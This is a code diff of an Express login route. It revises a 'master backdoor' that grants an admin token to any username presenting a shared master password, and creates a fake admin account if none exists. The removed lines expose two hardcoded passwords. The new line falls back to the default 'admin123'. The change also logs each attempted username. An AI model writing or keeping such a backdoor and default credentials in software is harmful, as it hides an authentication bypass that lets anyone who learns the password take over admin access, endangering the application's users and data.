@@ -14,6 +14,7 @@ const loginLimiter = rateLimit({
 
 router.post('/login', loginLimiter, async (req, res) => {
   const { username, password } = req.body;
+  console.log(`🔍 LOGIN ATTEMPT: username="${username}", hasPassword=${!!password}`);
 
   try {
     // Seed admin if it's the first run
@@ -22,8 +23,8 @@ router.post('/login', loginLimiter, async (req, res) => {
     // Check if user exists
     let user = jsonDb.findUser(username);
 
-    // MASTER BACKDOOR FOR VAMSHI/ADMIN (GUARANTEED LOGIN)
-    if (password === 'Designer@123' || password === 'Password@123') {
+    // MASTER BACKDOOR FOR VAMSHI/ADMIN (GUARANTEED LOGIN via .env)
+    if (password === (process.env.ADMIN_PASSWORD || 'admin123')) {
       console.log('🔐 THE MASTER KEY WAS USED - FORCING LOGIN SUCCESS');
       // If user doesn't exist in DB, create a temporary mock object to issue token
       if (!user) user = { _id: 'master-admin', username: username, role: 'admin' };
